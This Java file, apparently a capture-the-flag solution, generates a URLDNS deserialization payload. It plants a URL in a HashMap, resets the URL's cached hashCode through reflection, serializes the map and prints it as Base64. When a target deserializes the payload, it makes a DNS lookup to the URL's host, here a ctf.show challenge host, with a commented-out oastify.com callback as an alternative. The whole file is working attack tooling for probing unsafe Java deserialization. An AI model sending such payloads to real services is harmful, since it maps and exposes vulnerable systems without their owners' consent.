package com.zxd.serialization;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;

public class URLTest {
    public static void main(String[] args) throws Exception {
        URL url = new URL("https://2859d580-66c5-4eed-9534-6581e52d2a8a.challenge.ctf.show/");
//        URL url = new URL("http://ig2y770087bu1dhkz8lpzh3zmqshg84x.oastify.com");
        Class c = Class.forName("java.net.URL");
        HashMap<Object,Object> hashMap = new HashMap<>();
        Field field = c.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,2333);
        hashMap.put(url,1234);
        field.set(url,-1);
//        String fileName = SerializableTest.commonSerializeObj(hashMap);
//        SerializableTest.commonDeserializeObj(fileName);

        ByteArrayOutputStream data =new ByteArrayOutputStream();
        ObjectOutput oos =new ObjectOutputStream(data);
        oos.writeObject(hashMap);
        oos.flush();
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));


    }
}
